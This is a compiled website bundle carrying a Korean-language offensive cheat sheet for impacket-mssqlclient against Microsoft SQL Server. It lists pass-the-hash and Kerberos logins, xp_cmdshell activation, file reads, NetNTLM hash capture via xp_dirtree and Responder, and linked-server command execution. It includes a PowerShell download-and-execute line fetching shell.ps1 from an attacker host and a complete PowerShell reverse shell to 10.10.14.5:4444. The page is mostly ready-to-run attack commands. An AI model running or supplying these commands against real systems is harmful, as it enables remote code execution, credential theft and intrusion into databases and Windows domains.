"use strict";(self.webpackChunkmy_docusaurus_website=self.webpackChunkmy_docusaurus_website||[]).push([[9124],{8453:(e,s,n)=>{n.d(s,{R:()=>c,x:()=>d});var l=n(6540);const a={},i=l.createContext(a);function c(e){const s=l.useContext(i);return l.useMemo(function(){return"function"==typeof e?e(s):{...s,...e}},[s,e])}function d(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:c(e.components),l.createElement(i.Provider,{value:s},e.children)}},9425:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>h,contentTitle:()=>d,default:()=>m,frontMatter:()=>c,metadata:()=>l,toc:()=>t});const l=JSON.parse('{"id":"cheatsheet/database/impacket-mssqlclient","title":"impacket-mssqlclient - 1433","description":"https://github.com/fortra/impacket","source":"@site/docs/cheatsheet/database/impacket-mssqlclient.md","sourceDirName":"cheatsheet/database","slug":"/cheatsheet/database/impacket-mssqlclient","permalink":"/my-docusaurus-page/cheatsheet/database/impacket-mssqlclient","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":1,"frontMatter":{"sidebar_position":1},"sidebar":"tutorialSidebar","previous":{"title":"Database","permalink":"/my-docusaurus-page/category/database"},"next":{"title":"MongoDB - 27017","permalink":"/my-docusaurus-page/cheatsheet/database/mongodb"}}');var a=n(4848),i=n(8453);const c={sidebar_position:1},d="impacket-mssqlclient - 1433",h={},t=[{value:"\uc124\uce58",id:"\uc124\uce58",level:2},{value:"\uc5f0\uacb0 \ubc29\ubc95",id:"\uc5f0\uacb0-\ubc29\ubc95",level:2},{value:"\uae30\ubcf8 \uc5f0\uacb0",id:"\uae30\ubcf8-\uc5f0\uacb0",level:3},{value:"Windows \uc778\uc99d",id:"windows-\uc778\uc99d",level:3},{value:"Kerberos \uc778\uc99d",id:"kerberos-\uc778\uc99d",level:3},{value:"Hash \uc0ac\uc6a9 (Pass-the-Hash)",id:"hash-\uc0ac\uc6a9-pass-the-hash",level:3},{value:"\uc720\uc6a9\ud55c \uba85\ub839\uc5b4",id:"\uc720\uc6a9\ud55c-\uba85\ub839\uc5b4",level:2},{value:"\uc5f4\uac70 \uba85\ub839\uc5b4",id:"\uc5f4\uac70-\uba85\ub839\uc5b4",level:3},{value:"xp_cmdshell \uad00\ub9ac",id:"xp_cmdshell-\uad00\ub9ac",level:3},{value:"\uae30\ubcf8 SQL \ucffc\ub9ac",id:"\uae30\ubcf8-sql-\ucffc\ub9ac",level:2},{value:"\uc815\ubcf4 \uc218\uc9d1",id:"\uc815\ubcf4-\uc218\uc9d1",level:3},{value:"xp_cmdshell \uc218\ub3d9 \ud65c\uc131\ud654",id:"xp_cmdshell-\uc218\ub3d9-\ud65c\uc131\ud654",level:3},{value:"\uba85\ub839 \uc2e4\ud589",id:"\uba85\ub839-\uc2e4\ud589",level:3},{value:"\uacf5\uaca9 \uc2dc\ub098\ub9ac\uc624",id:"\uacf5\uaca9-\uc2dc\ub098\ub9ac\uc624",level:2},{value:"1. \uae30\ubcf8 \uc5f0\uacb0 \ubc0f \uc5f4\uac70",id:"1-\uae30\ubcf8-\uc5f0\uacb0-\ubc0f-\uc5f4\uac70",level:3},{value:"2. xp_cmdshell\uc744 \ud1b5\ud55c RCE",id:"2-xp_cmdshell\uc744-\ud1b5\ud55c-rce",level:3},{value:"3. \ud30c\uc77c \uc77d\uae30",id:"3-\ud30c\uc77c-\uc77d\uae30",level:3},{value:"4. NetNTLM Hash \ucea1\ucc98",id:"4-netntlm-hash-\ucea1\ucc98",level:3},{value:"Kerberos \uc778\uc99d \uc608\uc81c",id:"kerberos-\uc778\uc99d-\uc608\uc81c",level:2},{value:"1. \ud2f0\ucf13 \ud68d\ub4dd",id:"1-\ud2f0\ucf13-\ud68d\ub4dd",level:3},{value:"2. \uc5f0\uacb0",id:"2-\uc5f0\uacb0",level:3},{value:"\ub9c1\ud06c \uc11c\ubc84 \uacf5\uaca9",id:"\ub9c1\ud06c-\uc11c\ubc84-\uacf5\uaca9",level:2},{value:"\ub9c1\ud06c \uc11c\ubc84 \uc5f4\uac70",id:"\ub9c1\ud06c-\uc11c\ubc84-\uc5f4\uac70",level:3},{value:"\ub9c1\ud06c \uc11c\ubc84\ub97c \ud1b5\ud55c \uba85\ub839 \uc2e4\ud589",id:"\ub9c1\ud06c-\uc11c\ubc84\ub97c-\ud1b5\ud55c-\uba85\ub839-\uc2e4\ud589",level:3},{value:"\uc635\uc158",id:"\uc635\uc158",level:2},{value:"\uc2a4\ud06c\ub9bd\ud2b8 \uc2e4\ud589",id:"\uc2a4\ud06c\ub9bd\ud2b8-\uc2e4\ud589",level:2},{value:"SQL \ud30c\uc77c \uc2e4\ud589",id:"sql-\ud30c\uc77c-\uc2e4\ud589",level:3},{value:"\uc608\uc81c \uc6cc\ud06c\ud50c\ub85c\uc6b0",id:"\uc608\uc81c-\uc6cc\ud06c\ud50c\ub85c\uc6b0",level:2},{value:"\uc804\uccb4 \uacf5\uaca9 \ud750\ub984",id:"\uc804\uccb4-\uacf5\uaca9-\ud750\ub984",level:3},{value:"\ucc38\uace0",id:"\ucc38\uace0",level:2}];function r(e){const s={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",li:"li",p:"p",pre:"pre",ul:"ul",...(0,i.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(s.header,{children:(0,a.jsx)(s.h1,{id:"impacket-mssqlclient---1433",children:"impacket-mssqlclient - 1433"})}),"\n",(0,a.jsxs)(s.blockquote,{children:["\n",(0,a.jsx)(s.p,{children:(0,a.jsx)(s.a,{href:"https://github.com/fortra/impacket",children:"https://github.com/fortra/impacket"})}),"\n"]}),"\n",(0,a.jsx)(s.p,{children:"Impacket\uc758 MSSQL \ud074\ub77c\uc774\uc5b8\ud2b8 \ub3c4\uad6c\uc785\ub2c8\ub2e4."}),"\n",(0,a.jsx)(s.h2,{id:"\uc124\uce58",children:"\uc124\uce58"}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-bash",children:"# Kali Linux\nsudo apt install impacket-scripts\n\n# pip\npip install impacket\n"})}),"\n",(0,a.jsx)(s.h2,{id:"\uc5f0\uacb0-\ubc29\ubc95",children:"\uc5f0\uacb0 \ubc29\ubc95"}),"\n",(0,a.jsx)(s.h3,{id:"\uae30\ubcf8-\uc5f0\uacb0",children:"\uae30\ubcf8 \uc5f0\uacb0"}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-bash",children:"impacket-mssqlclient <USERNAME>@<RHOST>\nimpacket-mssqlclient <USERNAME>:<PASSWORD>@<RHOST>\n"})}),"\n",(0,a.jsx)(s.h3,{id:"windows-\uc778\uc99d",children:"Windows \uc778\uc99d"}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-bash",children:"impacket-mssqlclient <USERNAME>@<RHOST> -windows-auth\nimpacket-mssqlclient <RHOST>/<USERNAME>:<PASSWORD>@<RHOST> -windows-auth\nimpacket-mssqlclient <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST> -windows-auth\n"})}),"\n",(0,a.jsx)(s.h3,{id:"kerberos-\uc778\uc99d",children:"Kerberos \uc778\uc99d"}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-bash",children:"# \ud2f0\ucf13 \uc5c6\uc774\nimpacket-mssqlclient -k -no-pass <RHOST>\n\n# \ud2f0\ucf13 \uc9c0\uc815\nexport KRB5CCNAME=<USERNAME>.ccache\nimpacket-mssqlclient -k <RHOST>.<DOMAIN>\n"})}),"\n",(0,a.jsx)(s.h3,{id:"hash-\uc0ac\uc6a9-pass-the-hash",children:"Hash \uc0ac\uc6a9 (Pass-the-Hash)"}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-bash",children:"impacket-mssqlclient <USERNAME>@<RHOST> -hashes :<NTHASH>\nimpacket-mssqlclient <DOMAIN>/<USERNAME>@<RHOST> -hashes <LMHASH>:<NTHASH> -windows-auth\n"})}),"\n",(0,a.jsx)(s.h2,{id:"\uc720\uc6a9\ud55c-\uba85\ub839\uc5b4",children:"\uc720\uc6a9\ud55c \uba85\ub839\uc5b4"}),"\n",(0,a.jsx)(s.h3,{id:"\uc5f4\uac70-\uba85\ub839\uc5b4",children:"\uc5f4\uac70 \uba85\ub839\uc5b4"}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-bash",children:"SQL> enum_logins          # \ub85c\uadf8\uc778 \uacc4\uc815 \uc5f4\uac70\nSQL> enum_impersonate     # \uac00\uc7a5 \uac00\ub2a5\ud55c \uacc4\uc815 \uc5f4\uac70\nSQL> enum_db              # \ub370\uc774\ud130\ubca0\uc774\uc2a4 \uc5f4\uac70\n"})}),"\n",(0,a.jsx)(s.h3,{id:"xp_cmdshell-\uad00\ub9ac",children:"xp_cmdshell \uad00\ub9ac"}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-bash",children:"SQL> enable_xp_cmdshell   # xp_cmdshell \ud65c\uc131\ud654\nSQL> disable_xp_cmdshell  # xp_cmdshell \ube44\ud65c\uc131\ud654\nSQL> xp_cmdshell whoami   # \uba85\ub839 \uc2e4\ud589\n"})}),"\n",(0,a.jsx)(s.h2,{id:"\uae30\ubcf8-sql-\ucffc\ub9ac",children:"\uae30\ubcf8 SQL \ucffc\ub9ac"}),"\n",(0,a.jsx)(s.h3,{id:"\uc815\ubcf4-\uc218\uc9d1",children:"\uc815\ubcf4 \uc218\uc9d1"}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-sql",children:"SELECT @@version;\nSELECT SYSTEM_USER;\nSELECT USER_NAME();\nSELECT DB_NAME();\nSELECT name FROM sys.databases;\n"})}),"\n",(0,a.jsx)(s.h3,{id:"xp_cmdshell-\uc218\ub3d9-\ud65c\uc131\ud654",children:"xp_cmdshell \uc218\ub3d9 \ud65c\uc131\ud654"}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-sql",children:"EXEC sp_configure 'Show Advanced Options', 1;\nRECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1;\nRECONFIGURE;\n"})}),"\n",(0,a.jsx)(s.h3,{id:"\uba85\ub839-\uc2e4\ud589",children:"\uba85\ub839 \uc2e4\ud589"}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-sql",children:"EXEC xp_cmdshell 'whoami';\nEXEC xp_cmdshell 'powershell -c \"IEX(New-Object Net.WebClient).DownloadString(''http://<LHOST>/shell.ps1'')\"';\n"})}),"\n",(0,a.jsx)(s.h2,{id:"\uacf5\uaca9-\uc2dc\ub098\ub9ac\uc624",children:"\uacf5\uaca9 \uc2dc\ub098\ub9ac\uc624"}),"\n",(0,a.jsx)(s.h3,{id:"1-\uae30\ubcf8-\uc5f0\uacb0-\ubc0f-\uc5f4\uac70",children:"1. \uae30\ubcf8 \uc5f0\uacb0 \ubc0f \uc5f4\uac70"}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-bash",children:"# \uc5f0\uacb0\nimpacket-mssqlclient <USERNAME>:<PASSWORD>@<RHOST> -windows-auth\n\n# \ub85c\uadf8\uc778 \uacc4\uc815 \ud655\uc778\nSQL> enum_logins\n\n# \uac00\uc7a5 \uac00\ub2a5\ud55c \uacc4\uc815 \ud655\uc778\nSQL> enum_impersonate\n"})}),"\n",(0,a.jsx)(s.h3,{id:"2-xp_cmdshell\uc744-\ud1b5\ud55c-rce",children:"2. xp_cmdshell\uc744 \ud1b5\ud55c RCE"}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-bash",children:"# xp_cmdshell \ud65c\uc131\ud654\nSQL> enable_xp_cmdshell\n\n# \uba85\ub839 \uc2e4\ud589\nSQL> xp_cmdshell whoami\nSQL> xp_cmdshell dir C:\\\n\n# Reverse Shell\nSQL> xp_cmdshell powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')\"\n"})}),"\n",(0,a.jsx)(s.h3,{id:"3-\ud30c\uc77c-\uc77d\uae30",children:"3. \ud30c\uc77c \uc77d\uae30"}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-sql",children:"SELECT * FROM OPENROWSET(BULK 'C:\\Windows\\System32\\drivers\\etc\\hosts', SINGLE_CLOB) AS x;\n"})}),"\n",(0,a.jsx)(s.h3,{id:"4-netntlm-hash-\ucea1\ucc98",children:"4. NetNTLM Hash \ucea1\ucc98"}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-bash",children:"# Responder \uc2e4\ud589\nsudo responder -I tun0\n\n# MSSQL\uc5d0\uc11c\nSQL> exec master.dbo.xp_dirtree '\\\\<LHOST>\\share'\n"})}),"\n",(0,a.jsx)(s.h2,{id:"kerberos-\uc778\uc99d-\uc608\uc81c",children:"Kerberos \uc778\uc99d \uc608\uc81c"}),"\n",(0,a.jsx)(s.h3,{id:"1-\ud2f0\ucf13-\ud68d\ub4dd",children:"1. \ud2f0\ucf13 \ud68d\ub4dd"}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-bash",children:"impacket-getTGT <DOMAIN>/<USERNAME>:<PASSWORD>\nexport KRB5CCNAME=<USERNAME>.ccache\n"})}),"\n",(0,a.jsx)(s.h3,{id:"2-\uc5f0\uacb0",children:"2. \uc5f0\uacb0"}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-bash",children:"impacket-mssqlclient -k <RHOST>.<DOMAIN>\n"})}),"\n",(0,a.jsx)(s.h2,{id:"\ub9c1\ud06c-\uc11c\ubc84-\uacf5\uaca9",children:"\ub9c1\ud06c \uc11c\ubc84 \uacf5\uaca9"}),"\n",(0,a.jsx)(s.h3,{id:"\ub9c1\ud06c-\uc11c\ubc84-\uc5f4\uac70",children:"\ub9c1\ud06c \uc11c\ubc84 \uc5f4\uac70"}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-sql",children:"SELECT srvname,isremote FROM sysservers;\nEXEC sp_linkedservers;\n"})}),"\n",(0,a.jsx)(s.h3,{id:"\ub9c1\ud06c-\uc11c\ubc84\ub97c-\ud1b5\ud55c-\uba85\ub839-\uc2e4\ud589",children:"\ub9c1\ud06c \uc11c\ubc84\ub97c \ud1b5\ud55c \uba85\ub839 \uc2e4\ud589"}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-sql",children:"EXEC ('SELECT current_user') at [<LINKED_SERVER>];\nEXEC ('EXEC xp_cmdshell ''whoami''') at [<LINKED_SERVER>];\n"})}),"\n",(0,a.jsx)(s.h2,{id:"\uc635\uc158",children:"\uc635\uc158"}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-bash",children:"-windows-auth           # Windows \uc778\uc99d \uc0ac\uc6a9\n-k                      # Kerberos \uc778\uc99d \uc0ac\uc6a9\n-no-pass                # \ube44\ubc00\ubc88\ud638 \uc5c6\uc774 (Kerberos)\n-hashes LMHASH:NTHASH   # NTLM Hash \uc0ac\uc6a9\n-dc-ip IP               # Domain Controller IP\n-target-ip IP           # \ud0c0\uac9f IP (\ud638\uc2a4\ud2b8\uba85 \ub300\uc2e0)\n-port PORT              # \ud3ec\ud2b8 (\uae30\ubcf8 1433)\n-db DATABASE            # \uae30\ubcf8 \ub370\uc774\ud130\ubca0\uc774\uc2a4\n-file FILE              # SQL \ud30c\uc77c \uc2e4\ud589\n"})}),"\n",(0,a.jsx)(s.h2,{id:"\uc2a4\ud06c\ub9bd\ud2b8-\uc2e4\ud589",children:"\uc2a4\ud06c\ub9bd\ud2b8 \uc2e4\ud589"}),"\n",(0,a.jsx)(s.h3,{id:"sql-\ud30c\uc77c-\uc2e4\ud589",children:"SQL \ud30c\uc77c \uc2e4\ud589"}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-bash",children:"impacket-mssqlclient <USERNAME>@<RHOST> -file commands.sql\n"})}),"\n",(0,a.jsx)(s.p,{children:"commands.sql:"}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-sql",children:"SELECT @@version;\nEXEC xp_cmdshell 'whoami';\nSELECT name FROM sys.databases;\n"})}),"\n",(0,a.jsx)(s.h2,{id:"\uc608\uc81c-\uc6cc\ud06c\ud50c\ub85c\uc6b0",children:"\uc608\uc81c \uc6cc\ud06c\ud50c\ub85c\uc6b0"}),"\n",(0,a.jsx)(s.h3,{id:"\uc804\uccb4-\uacf5\uaca9-\ud750\ub984",children:"\uc804\uccb4 \uacf5\uaca9 \ud750\ub984"}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-bash",children:"# 1. \uc5f0\uacb0\nimpacket-mssqlclient Administrator:Password123@10.10.10.100 -windows-auth\n\n# 2. \uc5f4\uac70\nSQL> enum_logins\nSQL> enum_impersonate\n\n# 3. xp_cmdshell \ud65c\uc131\ud654\nSQL> enable_xp_cmdshell\n\n# 4. \uc815\ucc30\nSQL> xp_cmdshell whoami\nSQL> xp_cmdshell hostname\nSQL> xp_cmdshell ipconfig\n\n# 5. Reverse Shell\nSQL> xp_cmdshell powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n"})}),"\n",(0,a.jsx)(s.h2,{id:"\ucc38\uace0",children:"\ucc38\uace0"}),"\n",(0,a.jsxs)(s.ul,{children:["\n",(0,a.jsx)(s.li,{children:"MSSQL\uc740 \uae30\ubcf8\uc801\uc73c\ub85c 1433 \ud3ec\ud2b8 \uc0ac\uc6a9"}),"\n",(0,a.jsx)(s.li,{children:"xp_cmdshell\uc740 \uae30\ubcf8\uc801\uc73c\ub85c \ube44\ud65c\uc131\ud654"}),"\n",(0,a.jsx)(s.li,{children:"sysadmin \uad8c\ud55c\uc774 \uc788\uc5b4\uc57c xp_cmdshell \ud65c\uc131\ud654 \uac00\ub2a5"}),"\n",(0,a.jsx)(s.li,{children:"Windows \uc778\uc99d \uc2dc \ub3c4\uba54\uc778 \uc790\uaca9\uc99d\uba85 \ud544\uc694"}),"\n",(0,a.jsx)(s.li,{children:"Kerberos \uc778\uc99d \uc2dc KRB5CCNAME \ud658\uacbd\ubcc0\uc218 \uc124\uc815"}),"\n",(0,a.jsx)(s.li,{children:"\ub9c1\ud06c \uc11c\ubc84\ub97c \ud1b5\ud55c \uad8c\ud55c \uc0c1\uc2b9 \uac00\ub2a5"}),"\n",(0,a.jsx)(s.li,{children:"NetNTLM \ud574\uc2dc \ucea1\ucc98\ub85c \ud06c\ub799 \ub610\ub294 \ub9b4\ub808\uc774 \uacf5\uaca9 \uac00\ub2a5"}),"\n"]})]})}function m(e={}){const{wrapper:s}={...(0,i.R)(),...e.components};return s?(0,a.jsx)(s,{...e,children:(0,a.jsx)(r,{...e})}):r(e)}}}]);